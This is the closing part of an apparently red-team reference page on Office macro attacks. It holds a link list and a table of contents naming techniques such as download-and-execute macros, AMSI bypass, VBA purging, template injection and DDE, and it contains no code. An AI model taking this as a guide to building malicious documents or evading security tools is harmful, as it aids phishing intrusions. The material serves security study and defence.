href=https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/>Excel 4.0 Macros so hot right now - SneekyMonkey</a></li><li><a href=https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/>Macros and more with sharpshooter v2.0 - mdsec</a></li><li><a href=https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/>Further evasion in the forgotten corners of ms xls - malware.pizza</a></li><li><a href=https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9>Excel 4.0 macro old but new - fsx30</a></li><li><a href=https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/>XLS 4.0 macros and covenant - d-sec</a></li><li><a href=https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros>Inject macro from a remote dotm template - ired.team</a></li><li><a href=https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk>Phishinh with OLE - ired.team</a></li><li><a href=https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel>Phishing SLK - ired.team</a>bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)</li><li><a href=https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/>PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018</a></li><li><a href=https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/>AMSI in the heap - rmdavy</a></li><li><a href=https://github.com/rmdavy/WordAmsiBypass>WordAMSIBypass - rmdavy</a></li><li><a href=https://blog.f-secure.com/dechaining-macros-and-evading-edr/>Dechaining macros and evading EDR - Noora Hyvrinen</a></li><li><a href=http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html>Executing macros from docx with remote - RedXORBlueJuly 18, 2018</a></li><li><a href=https://adepts.of0x.cc/alternatives-copy-shellcode/>One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021</a></li><li><a href="http://www.greyhathacker.net/?p=948">Running macros via ActiveX controls - greyhathacker - September 29, 2016</a></li><li><a href=https://www.goggleheadedhacker.com/blog/post/23>Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d title='Last modified by Stuart Gray | December 10, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>December 10, 2022</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#office---attacks>Office - Attacks</a><ul><li><a href=#xlsm---hot-manchego>XLSM - Hot Manchego</a></li><li><a href=#xlm---macrome>XLM - Macrome</a></li><li><a href=#xlm-excel-40---sharpshooter>XLM Excel 4.0 - SharpShooter</a></li><li><a href=#xlm-excel-40---excelntdonut>XLM Excel 4.0 - EXCELntDonut</a></li><li><a href=#xlm-excel-40---exec>XLM Excel 4.0 - EXEC</a></li><li><a href=#docm---metasploit>DOCM - Metasploit</a></li><li><a href=#docm---download-and-execute>DOCM - Download and Execute</a></li><li><a href=#docm---macro-creator>DOCM - Macro Creator</a></li><li><a href=#docm---c-converted-to-office-vba-macro>DOCM - C# converted to Office VBA macro</a></li><li><a href=#docm---vba-wscript>DOCM - VBA Wscript</a></li><li><a href=#docm---vba-shell-execute-comment>DOCM - VBA Shell Execute Comment</a></li><li><a href=#docm---vba-spawning-via-svchostexe-using-scheduled-task>DOCM - VBA Spawning via svchost.exe using Scheduled Task</a></li><li><a href=#docm---wmi-com-functions>DOCM - WMI COM functions</a></li><li><a href=#docmxlm---macro-pack---macro-and-dde>DOCM/XLM - Macro Pack - Macro and DDE</a></li><li><a href=#docm---badassmacros>DOCM - BadAssMacros</a></li><li><a href=#docm---cactustorch-vba-module>DOCM - CACTUSTORCH VBA Module</a></li><li><a href=#docm---mmg-with-custom-dl--exec>DOCM - MMG with Custom DL + Exec</a></li><li><a href=#docm---activex-based-inkpicture-control-painted-event-autorun-macro>DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro</a></li><li><a href=#vba-obfuscation>VBA Obfuscation</a></li><li><a href=#vba-purging>VBA Purging</a><ul><li><a href=#officepurge>OfficePurge</a></li><li><a href=#evilclippy>EvilClippy</a></li></ul></li><li><a href=#vba---offensive-security-template>VBA - Offensive Security Template</a></li><li><a href=#vba---amsi>VBA - AMSI</a></li><li><a href=#docx---template-injection>DOCX - Template Injection</a><ul><li><a href=#remote-template>Remote Template</a></li><li><a href=#template-injections-tools>Template Injections Tools</a></li></ul></li><li><a href=#docx---dde>DOCX - DDE</a></li><li><a href=#slk---excel>SLK - Excel</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>